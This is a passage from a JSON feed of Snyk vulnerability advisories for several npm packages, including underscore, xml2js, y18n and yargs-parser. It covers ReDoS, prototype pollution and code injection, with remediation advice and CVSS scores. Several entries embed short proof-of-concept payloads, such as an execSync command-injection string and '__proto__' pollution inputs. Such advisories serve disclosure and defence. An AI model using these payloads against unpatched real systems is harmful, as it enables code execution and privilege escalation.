(Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `tough-cookie` to version 4.1.3 or higher.\n## References\n- [GitHub Commit](https://github.com/salesforce/tough-cookie/commit/12d474791bb856004e858fdb1c47b7608d09cf6e)\n- [GitHub Issue](https://github.com/salesforce/tough-cookie/issues/282)\n- [GitHub Release](https://github.com/salesforce/tough-cookie/releases/tag/v4.1.3)\n",
        "created_at": "2023-06-08T15:08:51Z",
        "updated_at": "2024-03-11T09:54:01Z",
        "problems": [
          {
            "id": "CVE-2023-26136",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.1.3 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.1.3"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.1.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2023-06-08T14:45:59Z",
            "exploit": "Proof of Concept",
            "publication_time": "2023-06-30T11:54:16Z",
            "references": [
              {
                "url": "https://github.com/salesforce/tough-cookie/commit/12d474791bb856004e858fdb1c47b7608d09cf6e",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/salesforce/tough-cookie/issues/282",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/salesforce/tough-cookie/releases/tag/v4.1.3",
                "title": "GitHub Release"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-UGLIFYJS-1727251",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[uglify-js](http://npmjs.com/package/uglify-js) is a JavaScript parser, minifier, compressor and beautifier toolkit.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `string_template` and the `decode_template` functions.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `uglify-js` to version 3.14.3 or higher.\n## References\n- [GitHub Commit](https://github.com/mishoo/UglifyJS/commit/157521066fc43cff2feab7ffc1ecea603617606b)\n- [GitHub Issue](https://github.com/mishoo/UglifyJS/issues/5133)\n- [GitHub PR](https://github.com/mishoo/UglifyJS/pull/5134)\n- [GitHub PR](https://github.com/mishoo/UglifyJS/pull/5135)\n",
        "created_at": "2021-09-30T14:25:50Z",
        "updated_at": "2024-03-06T14:05:17Z",
        "problems": [
          {
            "id": "CWE-1333",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.14.3 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.14.3"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.14.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2021-09-30T14:22:21Z",
            "exploit": "Not Defined",
            "publication_time": "2021-11-09T18:42:15Z",
            "references": [
              {
                "url": "https://github.com/mishoo/UglifyJS/commit/157521066fc43cff2feab7ffc1ecea603617606b",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/mishoo/UglifyJS/issues/5133",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/mishoo/UglifyJS/pull/5134",
                "title": "GitHub PR"
              },
              {
                "url": "https://github.com/mishoo/UglifyJS/pull/5135",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-UNDERSCORE-1080984",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Arbitrary Code Injection",
        "description": "## Overview\n[underscore](https://www.npmjs.org/package/underscore) is a JavaScript's functional programming helper library.\n\nAffected versions of this package are vulnerable to Arbitrary Code Injection via the `template` function, particularly when the `variable` option is taken from `_.templateSettings` as it is not sanitized.\r\n\r\n### PoC\r\n```\r\nconst _ = require('underscore');\r\n_.templateSettings.variable = \"a = this.process.mainModule.require('child_process').execSync('touch HELLO')\";\r\nconst t = _.template(\"\")();\r\n```\n## Remediation\nUpgrade `underscore` to version 1.13.0-2, 1.12.1 or higher.\n## References\n- [GitHub Additional Information](https://github.com/jashkenas/underscore/blob/cb5f6fc6c2400649d942f1e36f9e5191fb7a1bf1/modules/template.js#L71)\n- [GitHub Commit](https://github.com/jashkenas/underscore/commit/4c73526d43838ad6ab43a6134728776632adeb66)\n",
        "created_at": "2021-03-02T19:52:38Z",
        "updated_at": "2024-03-11T09:53:57Z",
        "problems": [
          {
            "id": "CVE-2021-23358",
            "source": "CVE"
          },
          {
            "id": "CWE-94",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.13.0-2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.13.0-2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=1.13.0-0 <1.13.0-2,>=1.3.2 <1.12.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.5,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:L/A:L/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2021-03-02T19:51:03Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-03-29T14:54:59Z",
            "references": [
              {
                "url": "https://github.com/jashkenas/underscore/blob/cb5f6fc6c2400649d942f1e36f9e5191fb7a1bf1/modules/template.js%23L71",
                "title": "GitHub Additional Information"
              },
              {
                "url": "https://github.com/jashkenas/underscore/commit/4c73526d43838ad6ab43a6134728776632adeb66",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-WORDWRAP-3149973",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within the `result` variable.\r\n\r\n**Note:**\r\n\r\nThe regex is vulnerable on its own, but the vulnerable function is not reachable as shipped in the package.\r\n\r\n\r\n## PoC\r\n```js\r\nconst wrap = require(\"word-wrap\");\r\n\r\nfor (let i = 0; i <= 10; i++) {\r\nconst attack = \"a\" + \"t\".repeat(i * 10_00000);\r\nconst start = performance.now();\r\nwrap(\r\nattack,\r\n{ trim: true },\r\n);\r\nconsole.log(`${attack.length} characters: ${performance.now() - start}ms`);\r\n}\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `word-wrap` to version 1.2.4 or higher.\n## References\n- [GitHub Commit](https://github.com/jonschlinkert/word-wrap/commit/420dce9a2412b21881202b73a3c34f0edc53cb2e)\n- [GitHub PR](https://github.com/jonschlinkert/word-wrap/pull/41)\n- [Vulnerable Code](https://github.com/jonschlinkert/word-wrap/blob/master/index.js#L39)\n",
        "created_at": "2022-11-28T14:29:41Z",
        "updated_at": "2024-03-11T09:54:01Z",
        "problems": [
          {
            "id": "CVE-2023-26115",
            "source": "CVE"
          },
          {
            "id": "CWE-1333",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.2.4 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.2.4"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.2.4"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "low",
            "score": 3.7,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P"
          }
        ],
        "effective_severity_level": "low",
        "slots": [
          {
            "disclosure_time": "2022-11-28T13:29:26Z",
            "exploit": "Proof of Concept",
            "publication_time": "2023-03-22T15:02:56Z",
            "references": [
              {
                "url": "https://github.com/jonschlinkert/word-wrap/commit/420dce9a2412b21881202b73a3c34f0edc53cb2e",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/jonschlinkert/word-wrap/pull/41",
                "title": "GitHub PR"
              },
              {
                "url": "https://github.com/jonschlinkert/word-wrap/blob/master/index.js%23L39",
                "title": "Vulnerable Code"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-XML2JS-5414874",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Prototype Pollution due to allowing an external attacker to edit or add new properties to an object. This is possible because the application does not properly validate incoming JSON keys, thus allowing the `__proto__` property to be edited.\n## PoC\n```js\r\nvar parseString = require('xml2js').parseString;\r\n\r\nlet normal_user_request    = \"<role>admin</role>\";\r\nlet malicious_user_request = \"<__proto__><role>admin</role></__proto__>\";\r\n\r\nconst update_user = (userProp) => {\r\n    // A user cannot alter his role. This way we prevent privilege escalations.\r\n    parseString(userProp, function (err, user) {\r\n        if(user.hasOwnProperty(\"role\") && user?.role.toLowerCase() === \"admin\") {\r\n            console.log(\"Unauthorized Action\");\r\n        } else {\r\n            console.log(user?.role[0]);\r\n        }\r\n    });\r\n}\r\n\r\nupdate_user(normal_user_request);\r\nupdate_user(malicious_user_request);\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `xml2js` to version 0.5.0 or higher.\n## References\n- [GitHub Commit](https://github.com/Leonidas-from-XIV/node-xml2js/commit/50a492aef9729b8b9b291c5cb2746ec7dc1369db)\n- [GitHub Issue](https://github.com/Leonidas-from-XIV/node-xml2js/issues/593)\n- [GitHub PR](https://github.com/Leonidas-from-XIV/node-xml2js/pull/603)\n- [GitHub PR](https://github.com/Leonidas-from-XIV/node-xml2js/pull/674)\n- [GitHub PR](https://github.com/Leonidas-from-XIV/node-xml2js/pull/681)\n- [PoC](https://fluidattacks.com/advisories/myers/)\n",
        "created_at": "2023-04-06T07:21:28Z",
        "updated_at": "2024-03-11T09:54:01Z",
        "problems": [
          {
            "id": "CVE-2023-0842",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.5.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.5.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.5.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2023-04-06T07:16:41Z",
            "exploit": "Proof of Concept",
            "publication_time": "2023-04-06T07:22:23Z",
            "references": [
              {
                "url": "https://github.com/Leonidas-from-XIV/node-xml2js/commit/50a492aef9729b8b9b291c5cb2746ec7dc1369db",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/Leonidas-from-XIV/node-xml2js/issues/593",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/Leonidas-from-XIV/node-xml2js/pull/603",
                "title": "GitHub PR"
              },
              {
                "url": "https://github.com/Leonidas-from-XIV/node-xml2js/pull/674",
                "title": "GitHub PR"
              },
              {
                "url": "https://github.com/Leonidas-from-XIV/node-xml2js/pull/681",
                "title": "GitHub PR"
              },
              {
                "url": "https://fluidattacks.com/advisories/myers/",
                "title": "PoC"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-Y18N-1021887",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[y18n](https://www.npmjs.com/package/y18n) is a the bare-bones internationalization library used by yargs\n\nAffected versions of this package are vulnerable to Prototype Pollution due to improper sanitization.\r\n## PoC by po6ix:\r\n```js\r\nconst y18n = require('y18n')();\r\n \r\ny18n.setLocale('__proto__');\r\ny18n.updateLocale({polluted: true});\r\n\r\nconsole.log(polluted); // true\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `y18n` to version 3.2.2, 4.0.1, 5.0.5 or higher.\n## References\n- [GitHub Commit](https://github.com/yargs/y18n/commit/a9ac604abf756dec9687be3843e2c93bfe581f25)\n- [GitHub Issue](https://github.com/yargs/y18n/issues/96)\n- [GitHub PR](https://github.com/yargs/y18n/pull/108)\n",
        "created_at": "2020-10-25T14:27:16Z",
        "updated_at": "2024-03-11T09:53:50Z",
        "problems": [
          {
            "id": "CVE-2020-7774",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.2.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.2.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.2.2,>=4.0.0 <4.0.1,>=5.0.0 <5.0.5"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2020-10-25T14:24:22Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-11-10T15:27:28Z",
            "references": [
              {
                "url": "https://github.com/yargs/y18n/commit/a9ac604abf756dec9687be3843e2c93bfe581f25",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/yargs/y18n/issues/96",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/yargs/y18n/pull/108",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-YARGSPARSER-560381",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[yargs-parser](https://www.npmjs.com/package/yargs-parser) is a mighty option parser used by yargs.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The library could be tricked into adding or modifying properties of `Object.prototype` using a `__proto__` payload.\r\n\r\nOur research team checked several attack vectors to verify this vulnerability:\r\n\r\n1. It could be used for [privilege escalation](https://gist.github.com/Kirill89/dcd8100d010896157a36624119439832).\r\n2. The library could be used to parse user input received from different sources:\r\n    - terminal emulators\r\n    - system calls from other code bases\r\n    - CLI RPC servers\r\n\r\n## PoC by Snyk\r\n```\r\nconst parser = require(\"yargs-parser\");\r\nconsole.log(parser('--foo.__proto__.bar baz'));\r\nconsole.log(({}).bar);\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** 